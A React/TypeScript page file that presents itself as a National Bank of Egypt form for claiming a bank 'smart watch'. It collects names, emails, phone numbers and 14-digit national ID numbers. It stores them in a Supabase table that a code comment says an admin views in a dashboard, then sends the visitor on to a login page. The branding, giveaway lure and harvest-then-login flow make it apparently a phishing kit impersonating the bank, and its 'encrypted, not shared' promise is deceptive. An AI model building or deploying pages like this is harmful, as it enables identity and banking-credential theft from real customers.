import { createFileRoute, useCanGoBack, useNavigate } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import type { LucideIcon } from "lucide-react";
import {
  ArrowLeft,
  ArrowRight,
  Building2,
  CreditCard,
  Globe,
  Lock,
  Mail,
  Phone,
  UserRound,
  Loader2,
} from "lucide-react";
import nbeLogo from "@/assets/nbe-logo-full.png";
import { supabase } from "@/integrations/supabase/client";
import {
  readPersonalDetails,
  savePersonalDetails,
  type PersonalDetails,
} from "@/lib/personal-details";

export const Route = createFileRoute("/user-information")({
  head: () => ({
    meta: [
      { title: "البيانات الشخصية | البنك الأهلي المصري" },
      {
        name: "description",
        content: "أدخل بياناتك الشخصية بدقة لإتمام طلب الحصول على ساعة البنك الأهلي الذكية.",
      },
      { property: "og:title", content: "البيانات الشخصية | البنك الأهلي المصري" },
      {
        property: "og:description",
        content: "أدخل بياناتك الشخصية بدقة لإتمام طلب الحصول على ساعة البنك الأهلي الذكية.",
      },
    ],
    links: [
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800;900&display=swap",
      },
    ],
  }),
  component: UserInformationPage,
});

type Lang = "ar" | "en";
type FieldName = keyof PersonalDetails;
type FormErrors = Partial<Record<FieldName, string>>;

const t = {
  ar: {
    title: "البيانات الشخصية",
    subtitle: "يرجى إدخال بياناتك بدقة كما تظهر في وثائقك الرسمية",
    fullName: "الاسم الكامل",
    fullNamePlaceholder: "أدخل اسمك الثلاثي كما في الهوية",
    email: "البريد الإلكتروني",
    emailPlaceholder: "name@example.com",
    phone: "رقم الهاتف المحمول",
    phonePlaceholder: "01XXXXXXXXX",
    nationalId: "الرقم القومي",
    nationalIdPlaceholder: "14 رقمًا",
    nationalIdHint: "يجب أن يتكون الرقم القومي من 14 رقمًا مطابقة لبطاقتك.",
    company: "اسم الشركة (اختياري)",
    companyPlaceholder: "اسم الشركة إن وجد",
    continue: "متابعة التسجيل",
    back: "رجوع",
    privacy: "بياناتك مشفرة ولن تُشارك مع أي طرف خارجي",
    bankName: "البنك الأهلي المصري",
    switchLang: "English",
    rights: "جميع الحقوق محفوظة - البنك الأهلي المصري ©",
    errors: {
      fullNameRequired: "من فضلك أدخل الاسم الكامل.",
      fullNameShort: "أدخل الاسم الكامل (اسمين على الأقل).",
      fullNameInvalid: "الاسم يجب أن يحتوي على حروف فقط.",
      emailRequired: "من فضلك أدخل البريد الإلكتروني.",
      emailInvalid: "أدخل بريدًا إلكترونيًا صحيحًا.",
      phoneRequired: "من فضلك أدخل رقم الهاتف المحمول.",
      phoneInvalid: "أدخل رقم هاتف مصري صحيح مكوّن من 11 رقمًا يبدأ بـ 010 أو 011 أو 012 أو 015.",
      nationalIdRequired: "من فضلك أدخل الرقم القومي.",
      nationalIdInvalid: "يجب أن يتكون الرقم القومي من 14 رقمًا.",
      companyShort: "اسم الشركة قصير جدًا.",
      summary: "من فضلك صحّح الحقول المحددة.",
    },
  },
  en: {
    title: "Personal Details",
    subtitle: "Please enter your details exactly as they appear on your official documents",
    fullName: "Full Name",
    fullNamePlaceholder: "Enter your full name as on your ID",
    email: "Email Address",
    emailPlaceholder: "name@example.com",
    phone: "Phone Number",
    phonePlaceholder: "01XXXXXXXXX",
    nationalId: "National ID",
    nationalIdPlaceholder: "14 digits",
    nationalIdHint: "Your national ID must be 14 digits and match your ID card.",
    company: "Company Name (optional)",
    companyPlaceholder: "Company name, if any",
    continue: "Continue",
    back: "Back",
    privacy: "Your data is encrypted and will not be shared with any third party",
    bankName: "National Bank of Egypt",
    switchLang: "العربية",
    rights: "All rights reserved - National Bank Of Egypt ©",
    errors: {
      fullNameRequired: "Please enter your full name.",
      fullNameShort: "Enter your full name (at least two names).",
      fullNameInvalid: "The name must contain letters only.",
      emailRequired: "Please enter your email address.",
      emailInvalid: "Enter a valid email address.",
      phoneRequired: "Please enter your phone number.",
      phoneInvalid:
        "Enter a valid Egyptian mobile number with 11 digits starting with 010, 011, 012, or 015.",
      nationalIdRequired: "Please enter your national ID.",
      nationalIdInvalid: "Your national ID must be 14 digits.",
      companyShort: "The company name is too short.",
      summary: "Please correct the highlighted fields.",
    },
  },
} as const;

type Messages = (typeof t)[Lang];

const EMPTY_FORM: PersonalDetails = {
  fullName: "",
  email: "",
  phone: "",
  nationalId: "",
  companyName: "",
};

const NAME_PATTERN = /^[\p{L}\s.'’-]+$/u;
const EMAIL_PATTERN = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
const PHONE_PATTERN = /^01[0125]\d{8}$/;
const NATIONAL_ID_PATTERN = /^\d{14}$/;
const FIELD_ORDER: FieldName[] = ["fullName", "email", "phone", "nationalId", "companyName"];

function validate(values: PersonalDetails, messages: Messages["errors"]): FormErrors {
  const next: FormErrors = {};
  const fullName = values.fullName.trim();
  const email = values.email.trim();
  const phone = values.phone.trim();
  const nationalId = values.nationalId.trim();
  const companyName = values.companyName.trim();

  if (!fullName) {
    next.fullName = messages.fullNameRequired;
  } else if (fullName.split(/\s+/).length < 2) {
    next.fullName = messages.fullNameShort;
  } else if (!NAME_PATTERN.test(fullName)) {
    next.fullName = messages.fullNameInvalid;
  }

  if (!email) {
    next.email = messages.emailRequired;
  } else if (!EMAIL_PATTERN.test(email)) {
    next.email = messages.emailInvalid;
  }

  if (!phone) {
    next.phone = messages.phoneRequired;
  } else if (!PHONE_PATTERN.test(phone)) {
    next.phone = messages.phoneInvalid;
  }

  if (!nationalId) {
    next.nationalId = messages.nationalIdRequired;
  } else if (!NATIONAL_ID_PATTERN.test(nationalId)) {
    next.nationalId = messages.nationalIdInvalid;
  }

  if (companyName && companyName.length < 2) {
    next.companyName = messages.companyShort;
  }

  return next;
}

type FieldProps = {
  id: FieldName;
  label: string;
  icon: LucideIcon;
  error?: string;
  hint?: string;
  children: React.ReactNode;
};

function Field({ id, label, icon: Icon, error, hint, children }: FieldProps) {
  return (
    <div className="space-y-2">
      <div className="flex items-center gap-2">
        <Icon className="h-4 w-4 text-muted-foreground" aria-hidden="true" />
        <label htmlFor={id} className="text-sm font-semibold text-foreground">
          {label}
        </label>
      </div>
      {children}
      {error ? (
        <p id={`${id}-error`} role="alert" className="text-xs font-semibold text-destructive">
          {error}
        </p>
      ) : hint ? (
        <p id={`${id}-hint`} className="text-xs text-muted-foreground">
          {hint}
        </p>
      ) : null}
    </div>
  );
}

function UserInformationPage() {
  const navigate = useNavigate();
  const canGoBack = useCanGoBack();
  const [lang, setLang] = useState<Lang>("ar");
  const [values, setValues] = useState<PersonalDetails>(EMPTY_FORM);
  const [errors, setErrors] = useState<FormErrors>({});
  const [submitting, setSubmitting] = useState(false);
  const [submitError, setSubmitError] = useState<string | null>(null);

  const c = t[lang];
  const isRtl = lang === "ar";
  const align = isRtl ? "text-right" : "text-left";
  const BackIcon = isRtl ? ArrowRight : ArrowLeft;

  useEffect(() => {
    const stored = readPersonalDetails();
    if (stored) setValues(stored);
  }, []);

  const inputTone = (field: FieldName) =>
    errors[field]
      ? "border-destructive focus:border-destructive focus:ring-destructive/20"
      : "border-input focus:border-primary focus:ring-primary/20";

  const iconSide = isRtl ? "right-4" : "left-4";
  const iconPadding = isRtl ? "pr-12 pl-4" : "pl-12 pr-4";

  const describedBy = (field: FieldName) => {
    if (errors[field]) return `${field}-error`;
    if (field === "nationalId") return "nationalId-hint";
    return undefined;
  };

  const updateField = (field: FieldName, value: string) => {
    setValues((prev) => ({ ...prev, [field]: value }));
    setErrors((prev) => {
      if (!prev[field]) return prev;
      const next = { ...prev };
      delete next[field];
      return next;
    });
  };

  const handleBack = () => {
    if (canGoBack) {
      window.history.back();
      return;
    }
    navigate({ to: "/" });
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setSubmitError(null);
    const nextErrors = validate(values, c.errors);
    setErrors(nextErrors);

    const firstInvalid = FIELD_ORDER.find((field) => nextErrors[field]);
    if (firstInvalid) {
      document.getElementById(firstInvalid)?.focus();
      return;
    }

    setSubmitting(true);
    try {
      // 1. حفظ بيانات العميل في جدول customers (للأدمن يشوفها في لوحة التحكم)
      const { error: customerError } = await supabase
        .from("customers")
        .insert({
          full_name: values.fullName.trim(),
          email: values.email.trim().toLowerCase(),
          phone: values.phone.trim(),
          national_id: values.nationalId.trim(),
          company_name: values.companyName.trim() || null,
        })
        .select()
        .maybeSingle();

      if (customerError) throw customerError;

      // 2. حفظ التفاصيل في localStorage. مسح أي معرف جلسة قديم للبدء من جديد
      if (typeof window !== "undefined") {
        sessionStorage.removeItem("nbe_session_id");
      }
      savePersonalDetails({
        fullName: values.fullName.trim(),
        email: values.email.trim(),
        phone: values.phone.trim(),
        nationalId: values.nationalId.trim(),
        companyName: values.companyName.trim(),
      });

      // 3. توجيه لصفحة تسجيل الدخول
      navigate({ to: "/login" });
    } catch (err: any) {
      setSubmitError(err.message || "فشل في حفظ البيانات. يرجى المحاولة مرة أخرى.");
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <div
      dir={isRtl ? "rtl" : "ltr"}
      className="flex min-h-screen flex-col bg-background text-foreground"
      style={{ fontFamily: '"Cairo", ui-sans-serif, system-ui, sans-serif' }}
    >
      <header className="flex items-center justify-between border-b border-border px-4 py-4 sm:px-6">
        <button
          type="button"
          onClick={() => setLang(lang === "ar" ? "en" : "ar")}
          className="flex items-center gap-2 text-sm font-semibold text-foreground"
        >
          <Globe className="h-5 w-5 text-muted-foreground" />
          {c.switchLang}
        </button>
        <img
          src={nbeLogo}
          alt={c.bankName}
          width={1920}
          height={520}
          loading="lazy"
          className="h-9 w-auto object-contain md:h-11"
        />
      </header>

      <main className="flex flex-1 flex-col items-center px-4 pt-8 pb-4 sm:pt-12">
        <form
          onSubmit={handleSubmit}
          noValidate
          className={`w-full max-w-md rounded-2xl bg-card p-5 shadow-sm ring-1 ring-border/60 sm:p-8 ${align}`}
        >
          <div className="text-center">
            <h1 className="text-2xl font-bold text-foreground">{c.title}</h1>
            <p className="mt-2 text-sm leading-relaxed text-muted-foreground">{c.subtitle}</p>
          </div>

          <div className="mt-8 space-y-4">
            <Field id="fullName" label={c.fullName} icon={UserRound} error={errors.fullName}>
              <div className="relative">
                <input
                  id="fullName"
                  type="text"
                  value={values.fullName}
                  onChange={(event) => updateField("fullName", event.target.value)}
                  placeholder={c.fullNamePlaceholder}
                  autoComplete="name"
                  autoFocus
                  aria-invalid={Boolean(errors.fullName)}
                  aria-describedby={describedBy("fullName")}
                  className={`w-full rounded-lg border bg-background py-4 text-sm outline-none transition-colors placeholder:text-muted-foreground focus:ring-2 disabled:opacity-60 ${iconPadding} ${align} ${inputTone("fullName")}`}
                />
                <UserRound
                  className={`pointer-events-none absolute top-1/2 h-5 w-5 -translate-y-1/2 text-muted-foreground ${iconSide}`}
                  aria-hidden="true"
                />
              </div>
            </Field>

            <Field id="email" label={c.email} icon={Mail} error={errors.email}>
              <div className="relative">
                <input
                  id="email"
                  type="email"
                  value={values.email}
                  onChange={(event) => updateField("email", event.target.value)}
                  placeholder={c.emailPlaceholder}
                  autoComplete="email"
                  dir="ltr"
                  aria-invalid={Boolean(errors.email)}
                  aria-describedby={describedBy("email")}
                  className={`w-full rounded-lg border bg-background py-4 text-left text-sm outline-none transition-colors placeholder:text-muted-foreground focus:ring-2 disabled:opacity-60 ${iconPadding} ${inputTone("email")}`}
                />
                <Mail
                  className={`pointer-events-none absolute top-1/2 h-5 w-5 -translate-y-1/2 text-muted-foreground ${iconSide}`}
                  aria-hidden="true"
                />
              </div>
            </Field>

            <Field id="phone" label={c.phone} icon={Phone} error={errors.phone}>
              <div className="relative">
                <input
                  id="phone"
                  type="tel"
                  inputMode="numeric"
                  value={values.phone}
                  onChange={(event) =>
                    updateField("phone", event.target.value.replace(/\D/g, "").slice(0, 11))
                  }
                  placeholder={c.phonePlaceholder}
                  autoComplete="tel"
                  dir="ltr"
                  aria-invalid={Boolean(errors.phone)}
                  aria-describedby={describedBy("phone")}
                  className={`w-full rounded-lg border bg-background py-4 text-left text-sm outline-none transition-colors placeholder:text-muted-foreground focus:ring-2 disabled:opacity-60 ${iconPadding} ${inputTone("phone")}`}
                />
                <Phone
                  className={`pointer-events-none absolute top-1/2 h-5 w-5 -translate-y-1/2 text-muted-foreground ${iconSide}`}
                  aria-hidden="true"
                />
              </div>
            </Field>

            <Field
              id="nationalId"
              label={c.nationalId}
              icon={CreditCard}
              error={errors.nationalId}
              hint={c.nationalIdHint}
            >
              <div className="relative">
                <input
                  id="nationalId"
                  type="text"
                  inputMode="numeric"
                  value={values.nationalId}
                  onChange={(event) =>
                    updateField("nationalId", event.target.value.replace(/\D/g, "").slice(0, 14))
                  }
                  placeholder={c.nationalIdPlaceholder}
                  autoComplete="off"
                  dir="ltr"
                  aria-invalid={Boolean(errors.nationalId)}
                  aria-describedby={describedBy("nationalId")}
                  className={`w-full rounded-lg border bg-background py-4 text-left text-sm outline-none transition-colors placeholder:text-muted-foreground focus:ring-2 disabled:opacity-60 ${iconPadding} ${inputTone("nationalId")}`}
                />
                <CreditCard
                  className={`pointer-events-none absolute top-1/2 h-5 w-5 -translate-y-1/2 text-muted-foreground ${iconSide}`}
                  aria-hidden="true"
                />
              </div>
            </Field>

            <Field id="companyName" label={c.company} icon={Building2} error={errors.companyName}>
              <div className="relative">
                <input
                  id="companyName"
                  type="text"
                  value={values.companyName}
                  onChange={(event) => updateField("companyName", event.target.value)}
                  placeholder={c.companyPlaceholder}
                  autoComplete="organization"
                  aria-invalid={Boolean(errors.companyName)}
                  aria-describedby={describedBy("companyName")}
                  className={`w-full rounded-lg border bg-background py-4 text-sm outline-none transition-colors placeholder:text-muted-foreground focus:ring-2 disabled:opacity-60 ${iconPadding} ${align} ${inputTone("companyName")}`}
                />
                <Building2
                  className={`pointer-events-none absolute top-1/2 h-5 w-5 -translate-y-1/2 text-muted-foreground ${iconSide}`}
                  aria-hidden="true"
                />
              </div>
            </Field>
          </div>

          {Object.keys(errors).length > 0 && (
            <p
              role="alert"
              className="mt-4 rounded-lg bg-destructive/10 px-3 py-2 text-xs font-semibold text-destructive"
            >
              {c.errors.summary}
            </p>
          )}

          {submitError && (
            <p
              role="alert"
              className="mt-4 rounded-lg bg-destructive/10 px-3 py-2 text-xs font-semibold text-destructive"
            >
              {submitError}
            </p>
          )}

          <button
            type="submit"
            disabled={submitting}
            className="mt-8 flex w-full items-center justify-center gap-2 rounded-lg bg-primary py-4 text-sm font-bold text-primary-foreground transition-colors hover:bg-primary/90 disabled:opacity-70"
          >
            {submitting ? (
              <>
                <Loader2 className="h-4 w-4 animate-spin" aria-hidden="true" />
                جاري الإكمال...
              </>
            ) : (
              <>
                إكمال التسجيل
                <ArrowRight className="h-4 w-4" aria-hidden="true" />
              </>
            )}
          </button>

          <button
            type="button"
            onClick={handleBack}
            className="mt-3 flex w-full items-center justify-center gap-2 rounded-lg bg-secondary py-4 text-sm font-bold text-secondary-foreground transition-colors hover:bg-secondary/80"
          >
            <BackIcon className="h-4 w-4" aria-hidden="true" />
            {c.back}
          </button>

          <p className="mt-5 flex items-center justify-center gap-1.5 text-center text-xs text-muted-foreground">
            <Lock className="h-4 w-4 shrink-0" aria-hidden="true" />
            {c.privacy}
          </p>
        </form>
      </main>

      <footer className="mt-6 px-4 pb-10">
        <p className="text-center text-xs text-muted-foreground">{c.rights}</p>
      </footer>
    </div>
  );
}
